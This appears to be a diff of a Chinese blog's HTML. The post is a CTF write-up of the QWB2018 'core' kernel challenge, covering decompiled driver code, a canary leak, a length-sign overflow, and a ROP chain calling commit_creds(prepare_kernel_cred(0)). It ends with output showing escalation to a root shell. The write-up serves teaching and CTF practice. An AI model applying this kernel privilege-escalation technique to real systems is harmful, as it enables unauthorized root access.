+./core.ko: ELF 64-bit LSB relocatable, x86-64, version <span class="m">1</span> <span class="o">(</span>SYSV<span class="o">)</span>, BuildID<span class="o">[</span>sha1<span class="o">]=</span>549436683d
 <span class="o">[</span>*<span class="o">]</span> <span class="s1">&#39;/home/m4x/pwn_repo/QWB2018_core/give_to_player/core.ko&#39;</span>
     Arch:     amd64-64-little
     RELRO:    No RELRO
     Stack:    Canary found
     NX:       NX enabled
-    PIE:      No PIE <span class="o">(</span>0x0<span class="o">)</span></code></pre></td></tr></table>
+    PIE:      No PIE <span class="o">(</span>0x0<span class="o">)</span>
+</code></pre></td></tr></table>
 </div>
-</div>
-<p>可以看出开启了 canary 保护，用 IDA 打开进一步分析。</p>
-
+</div><p>可以看出开启了 canary 保护，用 IDA 打开进一步分析。</p>
 <p><strong>init_module()</strong> 注册了 <code>/proc/core</code></p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-C" data-lang="C"><span class="lnt">1
+<pre class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -1768,13 +1683,13 @@ give_to_player <span class="o">[</span>master●●<span class="o">]</span> chec
   <span class="n">core_proc</span> <span class="o">=</span> <span class="n">proc_create</span><span class="p">(</span><span class="s">&#34;core&#34;</span><span class="p">,</span> <span class="mi">438LL</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">core_fops</span><span class="p">);</span>
   <span class="n">printk</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\x016c</span><span class="s">ore: created /proc/core entry</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
   <span class="k">return</span> <span class="mi">0LL</span><span class="p">;</span>
-<span class="p">}</span></code></pre></td></tr></table>
+<span class="p">}</span>
+</code></pre></td></tr></table>
 </div>
-</div>
-<p><strong>exit_core()</strong> 删除 <code>/proc/core</code></p>
+</div><p><strong>exit_core()</strong> 删除 <code>/proc/core</code></p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-C" data-lang="C"><span class="lnt">1
+<pre class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -1791,13 +1706,13 @@ give_to_player <span class="o">[</span>master●●<span class="o">]</span> chec
   <span class="k">if</span> <span class="p">(</span> <span class="n">core_proc</span> <span class="p">)</span>
     <span class="n">result</span> <span class="o">=</span> <span class="n">remove_proc_entry</span><span class="p">(</span><span class="s">&#34;core&#34;</span><span class="p">);</span>
   <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
-<span class="p">}</span></code></pre></td></tr></table>
+<span class="p">}</span>
+</code></pre></td></tr></table>
 </div>
-</div>
-<p><strong>core_ioctl()</strong> 定义了三条命令，分别调用 <strong>core_read()</strong>，<strong>core_copy_func()</strong> 和设置全局变量 <strong>off</strong></p>
+</div><p><strong>core_ioctl()</strong> 定义了三条命令，分别调用 <strong>core_read()</strong>，<strong>core_copy_func()</strong> 和设置全局变量 <strong>off</strong></p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-C" data-lang="C"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1834,13 +1749,13 @@ give_to_player <span class="o">[</span>master●●<span class="o">]</span> chec
       <span class="k">break</span><span class="p">;</span>
   <span class="p">}</span>
       <span class="n">core_copy_func</span><span class="p">(</span><span class="n">v3</span><span class="p">);</span>
-<span class="p">}</span></code></pre></td></tr></table>
+<span class="p">}</span>
+</code></pre></td></tr></table>
 </div>
-</div>
-<p><strong>core_read()</strong> 从 <code>v4[off]</code> 拷贝 64 个字节到用户空间，但要注意的是全局变量 <code>off</code> 使我们能够控制的，因此可以合理的控制 <code>off</code> 来 leak canary 和一些地址</p>
+</div><p><strong>core_read()</strong> 从 <code>v4[off]</code> 拷贝 64 个字节到用户空间，但要注意的是全局变量 <code>off</code> 使我们能够控制的，因此可以合理的控制 <code>off</code> 来 leak canary 和一些地址</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-C" data-lang="C"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1885,13 +1800,13 @@ give_to_player <span class="o">[</span>master●●<span class="o">]</span> chec
   <span class="n">strcpy</span><span class="p">(</span><span class="n">v4</span><span class="p">,</span> <span class="s">&#34;Welcome to the QWB CTF challenge.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
   <span class="k">if</span> <span class="p">(</span> <span class="n">copy_to_user</span><span class="p">(</span><span class="n">v1</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v4</span><span class="p">[</span><span class="n">off</span><span class="p">],</span> <span class="mi">64LL</span><span class="p">)</span> <span class="p">)</span>
     <span class="kr">__asm</span> <span class="p">{</span> <span class="n">swapgs</span> <span class="p">}</span>
-<span class="p">}</span></code></pre></td></tr></table>
+<span class="p">}</span>
+</code></pre></td></tr></table>
 </div>
-</div>
-<p><strong>core_copy_func()</strong> 从全局变量 <code>name</code> 中拷贝数据到局部变量中，长度是由我们指定的，当要注意的是 qmemcpy 用的是 <code>unsigned __int16</code>，但传递的长度是 <code>signed __int64</code>，因此如果控制传入的长度为 <code>0xffffffffffff0000|(0x100)</code> 等值，就可以栈溢出了</p>
+</div><p><strong>core_copy_func()</strong> 从全局变量 <code>name</code> 中拷贝数据到局部变量中，长度是由我们指定的，当要注意的是 qmemcpy 用的是 <code>unsigned __int16</code>，但传递的长度是 <code>signed __int64</code>，因此如果控制传入的长度为 <code>0xffffffffffff0000|(0x100)</code> 等值，就可以栈溢出了</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-C" data-lang="C"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1916,13 +1831,13 @@ give_to_player <span class="o">[</span>master●●<span class="o">]</span> chec
     <span class="n">printk</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\x016D</span><span class="s">etect Overflow&#34;</span><span class="p">);</span>
   <span class="k">else</span>
     <span class="n">qmemcpy</span><span class="p">(</span><span class="n">v1</span><span class="p">,</span> <span class="n">name</span><span class="p">,</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kr">__int16</span><span class="p">)</span><span class="n">a1</span><span class="p">);</span>    <span class="c1">// overflow
-</span><span class="c1"></span><span class="p">}</span></code></pre></td></tr></table>
+</span><span class="c1"></span><span class="p">}</span>
+</code></pre></td></tr></table>
 </div>
-</div>
-<p><strong>core_write()</strong> 向全局变量 <code>name</code> 上写，这样通过 <code>core_write()</code> 和 <code>core_copy_func()</code> 就可以控制 ropchain 了</p>
+</div><p><strong>core_write()</strong> 向全局变量 <code>name</code> 上写，这样通过 <code>core_write()</code> 和 <code>core_copy_func()</code> 就可以控制 ropchain 了</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-C" data-lang="C"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1945,38 +1860,34 @@ give_to_player <span class="o">[</span>master●●<span class="o">]</span> chec
     <span class="k">return</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="n">v3</span><span class="p">;</span>
   <span class="n">printk</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\x016c</span><span class="s">ore: error copying data from userspacen&#34;</span><span class="p">);</span>
   <span class="k">return</span> <span class="mh">0xFFFFFFF2LL</span><span class="p">;</span>
-<span class="p">}</span></code></pre></td></tr></table>
+<span class="p">}</span>
+</code></pre></td></tr></table>
 </div>
-</div>
-<h4 id="思路-1">思路</h4>
-
+</div><h4 id="思路-1">思路</h4>
 <p>经过如上的分析，可以得出以下的思路：</p>
-
 <ol>
 <li>通过 ioctl 设置 off，然后通过 core_read() leak 出 canary</li>
 <li>通过 core_write() 向 name 写，构造 ropchain</li>
 <li>通过 core_copy_func() 从 name 向局部变量上写，通过设置合理的长度和 canary 进行 rop</li>
 <li>通过 rop 执行 <code>commit_creds(prepare_kernel_cred(0))</code></li>
-<li>返回用户态，通过 system(&ldquo;/bin/sh&rdquo;) 等起 shell</li>
+<li>返回用户态，通过 system(&quot;/bin/sh&quot;) 等起 shell</li>
 </ol>
-
 <p>解释一下：</p>
-
 <ul>
-<li>如何获得 commit_creds()，prepare_kernel_cred() 的地址？
-
+<li>
+<p>如何获得 commit_creds()，prepare_kernel_cred() 的地址？</p>
 <ul>
 <li>/tmp/kallsyms 中保存了这些地址，可以直接读取，同时根据偏移固定也能确定 gadgets 的地址</li>
-</ul></li>
-
-<li><p>如何返回用户态？</p>
-
+</ul>
+</li>
+<li>
+<p>如何返回用户态？</p>
 <ul>
 <li><code>swapgs; iretq</code>，之前说过需要设置 <code>cs, rflags</code> 等信息，可以写一个函数保存这些信息</li>
 </ul>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-C" data-lang="C"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -2001,7 +1912,6 @@ give_to_player <span class="o">[</span>master●●<span class="o">]</span> chec
 </span><span class="lnt">23
 </span><span class="lnt">24
 </span><span class="lnt">25
-</span><span class="lnt">26
 </span></code></pre></td>
 <td class="lntd">
 <pre class="chroma"><code class="language-C" data-lang="C"><span class="c1">// intel flavor assembly
@@ -2029,45 +1939,45 @@ give_to_player <span class="o">[</span>master●●<span class="o">]</span> chec
     <span class="o">:</span>
     <span class="o">:</span> <span class="s">&#34;memory&#34;</span>
 <span class="p">);</span>
-<span class="p">}</span></code></pre></td></tr></table>
+</code></pre></td></tr></table>
 </div>
 </div></li>
-
-<li><p>Why bother returning to Userspace?</p>
-
+</ul>
+<p>}
+```</p>
+<ul>
+<li>Why bother returning to Userspace?
 <ul>
 <li>Most useful things we want to do are much easier from userland.</li>
 <li>In KernelSpace, there’s no easy way to:
-
 <ul>
 <li>Modify the filesystem</li>
 <li>Create a new process</li>
 <li>Create network connections</li>
-</ul></li>
-</ul></li>
 </ul>
-
+</li>
+</ul>
+</li>
+</ul>
 <h4 id="exploit-1">Exploit</h4>
-
 <p>先说一下怎么调试，qemu 内置有 gdb 的接口，通过 help 查看</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="lnt">1
+<pre class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
 <pre class="chroma"><code class="language-bash" data-lang="bash">give_to_player <span class="o">[</span>master●●<span class="o">]</span> qemu-system-x86_64 --help <span class="p">|</span> grep gdb
 -gdb dev        <span class="nb">wait</span> <span class="k">for</span> gdb connection on <span class="s1">&#39;dev&#39;</span>
--s              shorthand <span class="k">for</span> -gdb tcp::1234</code></pre></td></tr></table>
+-s              shorthand <span class="k">for</span> -gdb tcp::1234
+</code></pre></td></tr></table>
 </div>
-</div>
-<p>即可以通过 <code>-gdb tcp:port</code> 或者 <code>-s</code> 来开启调试端口，<code>start.sh</code> 中已经有了 <code>-s</code>，不必再自己设置。</p>
-
+</div><p>即可以通过 <code>-gdb tcp:port</code> 或者 <code>-s</code> 来开启调试端口，<code>start.sh</code> 中已经有了 <code>-s</code>，不必再自己设置。</p>
 <p>另外通过 <code>gdb ./vmlinux</code> 启动时，虽然加载了 kernel 的符号表，但没有加载驱动 <code>core.ko</code> 的符号表，可以通过 <code>add-symbol-file core.ko textaddr</code> 加载</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="lnt">1
+<pre class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -2082,26 +1992,25 @@ Usage: add-symbol-file FILE ADDR <span class="o">[</span>-s &lt;SECT&gt; &lt;SEC
 ADDR is the starting address of the file<span class="err">&#39;</span>s text.
 The optional arguments are section-name section-address pairs and
 should be specified <span class="k">if</span> the data and bss segments are not contiguous
-with the text.  SECT is a section name to be loaded at SECT_ADDR.</code></pre></td></tr></table>
+with the text.  SECT is a section name to be loaded at SECT_ADDR.
+</code></pre></td></tr></table>
 </div>
-</div>
-<p>.text 段的地址可以通过 <code>/sys/modules/core/section/.text</code> 来查看，查看需要 root 权限，因此为了方便调试，我们再改一下 <code>init</code></p>
+</div><p>.text 段的地址可以通过 <code>/sys/modules/core/section/.text</code> 来查看，查看需要 root 权限，因此为了方便调试，我们再改一下 <code>init</code></p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="lnt">1
+<pre class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
 <pre class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># setsid /bin/cttyhack setuidgid 1000 /bin/sh</span>
-setsid /bin/cttyhack setuidgid <span class="m">0</span> /bin/sh</code></pre></td></tr></table>
+setsid /bin/cttyhack setuidgid <span class="m">0</span> /bin/sh
+</code></pre></td></tr></table>
 </div>
-</div>
-<p>重新打包，这样启动的时候就是 root 权限了。</p>
-
+</div><p>重新打包，这样启动的时候就是 root 权限了。</p>
 <p>比如：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="lnt">  1
+<pre class="chroma"><code><span class="lnt">  1
 </span><span class="lnt">  2
 </span><span class="lnt">  3
 </span><span class="lnt">  4
@@ -2265,7 +2174,7 @@ setsid /bin/cttyhack setuidgid <span class="m">0</span> /bin/sh</code></pre></td
 </span></code></pre></td>
 <td class="lntd">
 <pre class="chroma"><code class="language-bash" data-lang="bash">// qemu 内
-/ <span class="c1"># cat /sys/module/core/sections/.text</span> 
+/ <span class="c1"># cat /sys/module/core/sections/.text </span>
 0xffffffffc018b000
 ......
 ......
@@ -2326,7 +2235,7 @@ LEGEND: STACK <span class="p">|</span> HEAP <span class="p">|</span> CODE <span 
     ↓
    0xffffffffa16b65a0    jmp    0xffffffffa16b6541
     ↓
-   0xffffffffa16b6541    or     byte ptr ds:<span class="o">[</span>r12 + <span class="m">2</span><span class="o">]</span>, 0x20
+   0xffffffffa16b6541    or     byte ptr ds:<span class="o">[</span>r12 + 2<span class="o">]</span>, 0x20
    0xffffffffa16b6548    pushfq
    0xffffffffa16b6549    pop    rax
    0xffffffffa16b654a    <span class="nb">test</span>   ah, <span class="m">2</span>
@@ -2339,14 +2248,14 @@ LEGEND: STACK <span class="p">|</span> HEAP <span class="p">|</span> CODE <span 
    0xffffffffa16b655d    mov    rax, qword ptr <span class="o">[</span>rbx<span class="o">]</span>
    0xffffffffa16b6560    <span class="nb">test</span>   al, <span class="m">8</span>
 ────────────────────────────────────────<span class="o">[</span> STACK <span class="o">]</span>────────────────────────────────────────
-<span class="m">00</span>:0000│ rsp  0xffffffffa2803eb8 —▸ 0xffffffffa16b65a0 ◂— 0xff894cf6894c9feb
-<span class="m">01</span>:0008│      0xffffffffa2803ec0 ◂— 0xc2
-<span class="m">02</span>:0010│      0xffffffffa2803ec8 —▸ 0xffffffffa2cc4900 ◂— 0xcccccccccccccccc
-<span class="m">03</span>:0018│      0xffffffffa2803ed0 —▸ 0xffff8f2506688900 ◂— jb     0xffff8f2506688971 /* 0x65642f3d746f6f72<span class="p">;</span> <span class="s1">&#39;root=/dev/ram&#39;</span> */
-<span class="m">04</span>:0020│      0xffffffffa2803ed8 —▸ 0xffffffffa2ccc2c0 ◂— 0xcccccccccccccccc
-<span class="m">05</span>:0028│      0xffffffffa2803ee0 ◂— 0x0
+00:0000│ rsp  0xffffffffa2803eb8 —▸ 0xffffffffa16b65a0 ◂— 0xff894cf6894c9feb
+01:0008│      0xffffffffa2803ec0 ◂— 0xc2
+02:0010│      0xffffffffa2803ec8 —▸ 0xffffffffa2cc4900 ◂— 0xcccccccccccccccc
+03:0018│      0xffffffffa2803ed0 —▸ 0xffff8f2506688900 ◂— jb     0xffff8f2506688971 /* 0x65642f3d746f6f72<span class="p">;</span> <span class="s1">&#39;root=/dev/ram&#39;</span> */
+04:0020│      0xffffffffa2803ed8 —▸ 0xffffffffa2ccc2c0 ◂— 0xcccccccccccccccc
+05:0028│      0xffffffffa2803ee0 ◂— 0x0
 ... ↓
-<span class="m">07</span>:0038│      0xffffffffa2803ef0 —▸ 0xffffffffa16b673a ◂— jmp    0xffffffffa16b6735 /* 0x564190909090f9eb */
+07:0038│      0xffffffffa2803ef0 —▸ 0xffffffffa16b673a ◂— jmp    0xffffffffa16b6735 /* 0x564190909090f9eb */
 pwndbg&gt; c
 Continuing.
 ......
@@ -2379,7 +2288,7 @@ ERROR: Could not find ELF base!
 ERROR: Could not find ELF base!
 ERROR: Could not find ELF base!
 
-Breakpoint <span class="m">1</span>, 0xffffffffc018b063 in core_read <span class="o">()</span>
+Breakpoint 1, 0xffffffffc018b063 in core_read <span class="o">()</span>
 ERROR: Could not find ELF base!
 ERROR: Could not find ELF base!
 LEGEND: STACK <span class="p">|</span> HEAP <span class="p">|</span> CODE <span class="p">|</span> DATA <span class="p">|</span> RWX <span class="p">|</span> RODATA
@@ -2415,22 +2324,22 @@ LEGEND: STACK <span class="p">|</span> HEAP <span class="p">|</span> CODE <span 
    0xffffffffc018b08e &lt;core_read+43&gt;    mov    rdx, rbx
    0xffffffffc018b091 &lt;core_read+46&gt;    mov    rdi, -0x3fe73f6b
 ────────────────────────────────────────<span class="o">[</span> STACK <span class="o">]</span>────────────────────────────────────────
-<span class="m">00</span>:0000│ rsp  0xffffb0f3800dbe68 —▸ 0xffffffffc018b19b <span class="o">(</span>core_ioctl+60<span class="o">)</span> ◂— 0xc7c748d6894818eb
-<span class="m">01</span>:0008│      0xffffb0f3800dbe70 —▸ 0xffff8f25071b3840 ◂— add    qword ptr <span class="o">[</span>r8<span class="o">]</span>, rax /* 0x81b6f000014b */
-<span class="m">02</span>:0010│      0xffffb0f3800dbe78 —▸ 0xffffffffa17dd6d1 ◂— 0xe824048948df8948
-<span class="m">03</span>:0018│      0xffffb0f3800dbe80 ◂— 0x889b
-<span class="m">04</span>:0020│      0xffffb0f3800dbe88 —▸ 0xffff8f2507680d00 ◂— <span class="m">0</span>
-<span class="m">05</span>:0028│      0xffffb0f3800dbe90 —▸ 0xffffffffa178ecfa ◂— 0x9e840ffffffdfd3d
-<span class="m">06</span>:0030│      0xffffb0f3800dbe98 —▸ 0xffffb0f3800dbe70 —▸ 0xffff8f25071b3840 ◂— add    qword ptr <span class="o">[</span>r8<span class="o">]</span>, rax /* 0x81b6f000014b */
-<span class="m">07</span>:0038│      0xffffb0f3800dbea0 ◂— 0x10
+00:0000│ rsp  0xffffb0f3800dbe68 —▸ 0xffffffffc018b19b <span class="o">(</span>core_ioctl+60<span class="o">)</span> ◂— 0xc7c748d6894818eb
+01:0008│      0xffffb0f3800dbe70 —▸ 0xffff8f25071b3840 ◂— add    qword ptr <span class="o">[</span>r8<span class="o">]</span>, rax /* 0x81b6f000014b */
+02:0010│      0xffffb0f3800dbe78 —▸ 0xffffffffa17dd6d1 ◂— 0xe824048948df8948
+03:0018│      0xffffb0f3800dbe80 ◂— 0x889b
+04:0020│      0xffffb0f3800dbe88 —▸ 0xffff8f2507680d00 ◂— <span class="m">0</span>
+05:0028│      0xffffb0f3800dbe90 —▸ 0xffffffffa178ecfa ◂— 0x9e840ffffffdfd3d
+06:0030│      0xffffb0f3800dbe98 —▸ 0xffffb0f3800dbe70 —▸ 0xffff8f25071b3840 ◂— add    qword ptr <span class="o">[</span>r8<span class="o">]</span>, rax /* 0x81b6f000014b */
+07:0038│      0xffffb0f3800dbea0 ◂— 0x10
 Breakpoint core_read
-pwndbg&gt;</code></pre></td></tr></table>
+pwndbg&gt;
+</code></pre></td></tr></table>
 </div>
-</div>
-<p>最终 <a href="https://github.com/bash-c/pwn_repo/blob/master/QWB2018_core/rop.c">exp</a></p>
+</div><p>最终 <a href="https://github.com/bash-c/pwn_repo/blob/master/QWB2018_core/rop.c">exp</a></p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-C" data-lang="C"><span class="lnt">  1
+<pre class="chroma"><code><span class="lnt">  1
 </span><span class="lnt">  2
 </span><span class="lnt">  3
 </span><span class="lnt">  4
@@ -2803,13 +2712,13 @@ pwndbg&gt;</code></pre></td></tr></table>
 	<span class="n">core_copy_func</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mh">0xffffffffffff0000</span> <span class="o">|</span> <span class="p">(</span><span class="mh">0x100</span><span class="p">));</span>
 
 	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
-<span class="p">}</span></code></pre></td></tr></table>
+<span class="p">}</span>
+</code></pre></td></tr></table>
 </div>
-</div>
-<h4 id="get-root-shell-1">get root shell</h4>
+</div><h4 id="get-root-shell-1">get root shell</h4>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -2861,7 +2770,7 @@ give_to_player <span class="o">[</span>master●●<span class="o">]</span> ./st
 / $ ls /tmp/
 exploit   kallsyms
 / $ id
-<span class="nv">uid</span><span class="o">=</span><span class="m">1000</span><span class="o">(</span>chal<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span><span class="m">1000</span><span class="o">(</span>chal<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span><span class="m">1000</span><span class="o">(</span>chal<span class="o">)</span>
+<span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>chal<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>chal<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>chal<span class="o">)</span>
 / $ /tmp/exploit
 <span class="o">[</span>*<span class="o">]</span>status has been saved.
 commit_creds addr: 0xffffffffbd09c8e0
@@ -2872,47 +2781,28 @@ prepare_kernel_cred addr: 0xffffffffbd09cce0
 <span class="o">[</span>+<span class="o">]</span>canary: 0x6be486f377bb8600
 <span class="o">[</span>*<span class="o">]</span>copy from user with size: -65280
 / <span class="c1"># id</span>
-<span class="nv">uid</span><span class="o">=</span><span class="m">0</span><span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span><span class="m">0</span><span class="o">(</span>root<span class="o">)</span></code></pre></td></tr></table>
+<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+</code></pre></td></tr></table>
 </div>
-</div>
-<p>当然这个题目也有其他做法，下篇再分析。</p>
-
+</div><p>当然这个题目也有其他做法，下篇再分析。</p>
 <h2 id="reference-and-thanks-to">Reference and Thanks to</h2>
-
 <p>Linux Manual Pages</p>
-
-<p><a href="https://zh.wikipedia.org/wiki/内核">https://zh.wikipedia.org/wiki/内核</a></p>
-
-<p><a href="https://zh.wikipedia.org/wiki/分级保护域">https://zh.wikipedia.org/wiki/分级保护域</a></p>
-
+<p><a href="https://zh.wikipedia.org/wiki/">https://zh.wikipedia.org/wiki/</a>内核</p>
+<p><a href="https://zh.wikipedia.org/wiki/">https://zh.wikipedia.org/wiki/</a>分级保护域</p>
 <p><a href="https://www.anquanke.com/post/id/86490">https://www.anquanke.com/post/id/86490</a></p>
-
 <p><a href="https://zh.wikipedia.org/wiki/Ioctl">https://zh.wikipedia.org/wiki/Ioctl</a></p>
-
 <p><a href="http://www.freebuf.com/articles/system/54263.html">http://www.freebuf.com/articles/system/54263.html</a></p>
-
 <p><a href="https://blog.csdn.net/zqixiao_09/article/details/50839042">https://blog.csdn.net/zqixiao_09/article/details/50839042</a></p>
-
 <p><a href="https://bbs.pediy.com/thread-247054.htm">https://bbs.pediy.com/thread-247054.htm</a></p>
-
 <p><a href="https://yq.aliyun.com/articles/53679">https://yq.aliyun.com/articles/53679</a></p>
-
 <p><a href="https://whereisk0shl.top/NCSTISC%20Linux%20Kernel%20pwn450%20writeup.html">https://whereisk0shl.top/NCSTISC%20Linux%20Kernel%20pwn450%20writeup.html</a></p>
-
 <p><a href="https://code.woboq.org/linux/linux/include/linux/cred.h.html#cred">https://code.woboq.org/linux/linux/include/linux/cred.h.html#cred</a></p>
-
 <p><a href="https://elixir.bootlin.com/linux/v4.4.72/source/include/linux/cred.h#L118">https://elixir.bootlin.com/linux/v4.4.72/source/include/linux/cred.h#L118</a></p>
-
 <p><a href="http://muhe.live/2017/07/13/babydriver-writeup/">http://muhe.live/2017/07/13/babydriver-writeup/</a></p>
-
 <p><a href="https://xz.aliyun.com/t/2306">https://xz.aliyun.com/t/2306</a></p>
-
 <p><a href="https://unix.stackexchange.com/questions/5518/what-is-the-difference-between-the-following-kernel-makefile-terms-vmlinux-vml">https://unix.stackexchange.com/questions/5518/what-is-the-difference-between-the-following-kernel-makefile-terms-vmlinux-vml</a></p>
-
 <p><a href="https://blog.csdn.net/gatieme/article/details/78311841">https://blog.csdn.net/gatieme/article/details/78311841</a></p>
-
 <p><a href="https://veritas501.space/2018/06/05/qwb2018%20core/">https://veritas501.space/2018/06/05/qwb2018%20core/</a></p>
-
 <p><a href="http://blog.vmsplice.net/2011/09/how-to-share-files-instantly-between.html">http://blog.vmsplice.net/2011/09/how-to-share-files-instantly-between.html</a></p>
     </div>
 
@@ -2948,8 +2838,8 @@ prepare_kernel_cred addr: 0xffffffffbd09cce0
             <span class="prev-text nav-mobile">Prev</span>
           </a>
         
-          <a class="next" href="/post/cve-2017-11543-analysis/">
-            <span class="next-text nav-default">CVE-2017-11543 Analysis</span>
+          <a class="next" href="/post/jarvisoj-pwn-writeup/">
+            <span class="next-text nav-default">JarvisOJ Pwn Writeup</span>
             <span class="prev-text nav-mobile">Next</span>
             
             <i class="iconfont">
@@ -3048,7 +2938,7 @@ prepare_kernel_cred addr: 0xffffffffbd09cce0
     &copy;
     
        -
-    2019
+    2020
     <span class="heart">
       
       <i class="iconfont">
